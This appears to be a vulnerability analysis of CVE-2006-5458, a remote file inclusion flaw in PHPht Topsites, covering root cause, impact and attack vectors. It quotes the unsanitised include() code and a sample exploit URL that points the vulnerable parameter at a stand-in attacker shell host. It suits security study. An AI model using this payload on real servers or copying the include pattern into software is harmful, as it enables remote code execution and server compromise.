Based on the provided information, here's an analysis of CVE-2006-5458:

**Root Cause of Vulnerability:**
The vulnerability stems from a failure to sanitize the `phpht_real_path` parameter in the `common.php` file of PHPht Topsites. The application directly includes files based on this user-controlled parameter.

**Weaknesses/Vulnerabilities Present:**
- **Remote File Inclusion (RFI):** The primary vulnerability is that the application is susceptible to RFI. An attacker can specify a remote URL through the `phpht_real_path` parameter, causing the server to include and execute arbitrary code from the attacker's controlled location.

**Impact of Exploitation:**
- **Arbitrary Code Execution:** Successful exploitation allows an attacker to execute arbitrary PHP code on the server. This can lead to a complete compromise of the web application and potentially the server itself.
- **Data Theft:** An attacker could use this to steal sensitive data from the server's file system, databases or other resources.
- **Malware Installation:**  The attacker could install malware on the server, establishing a persistent backdoor.
- **Denial of Service (DoS):** An attacker could potentially use this vulnerability to cause a denial of service.

**Attack Vectors:**
- **HTTP GET Request:** The attack vector is through a specially crafted HTTP GET request to `common.php`.
- **`phpht_real_path` Parameter:** The attacker injects a malicious URL into the `phpht_real_path` parameter.

**Required Attacker Capabilities/Position:**
- **Network Access:** The attacker needs to be able to send HTTP requests to the vulnerable server.
- **Basic Knowledge of HTTP:** The attacker needs to know how to construct an HTTP request with URL parameters.
- **Hosting of Malicious Code:** The attacker needs to host a malicious PHP file on a server they control, which is then included and executed via the vulnerability.

**Additional Details:**

The exploit-db entry gives specific vulnerable code within `common.php`:

```php
include($phpht_real_path . 'config.'.$phpEx);
include($phpht_real_path . 'includes/db.'.$phpEx);
include($phpht_real_path . 'includes/Template.'.$phpEx);
include($phpht_real_path . 'language/lang_english/lang_main.'.$phpEx);
```

and demonstrates a sample exploit:

`http://www.hedef.com/[script_path]/common.php?phpht_real_path=http://sh3LL?`

The vulnerable application, PHPht Topsites, is identified by its download link.
